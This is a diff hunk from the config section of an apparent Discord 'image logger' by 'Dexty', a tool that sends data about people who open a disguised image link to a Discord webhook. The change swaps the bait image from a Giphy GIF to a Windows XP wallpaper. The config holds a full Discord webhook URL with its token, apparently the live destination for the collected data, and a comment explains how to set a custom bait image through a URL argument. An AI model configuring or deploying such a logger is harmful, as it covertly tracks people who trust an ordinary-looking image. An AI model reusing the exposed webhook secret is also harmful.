@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1370795703118463046/l7xGi3wJtTkTynqKEnUfNAm_SoUXB_XaZchZhoO28MiWGIXhcsVI3XOcJlzjaW4lJOue",
-    "image": "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExdTU1ejU2bng0OXRyMnZ4NGR0cTIzb3oyeW9hNTJxMWxoNHh1dzVsMiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/CGXnGb7zpsvXD2uwvd/giphy.gif", # You can also have a custom image by using a URL argument
+    "image": "https://www.pcworld.com/wp-content/uploads/2023/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
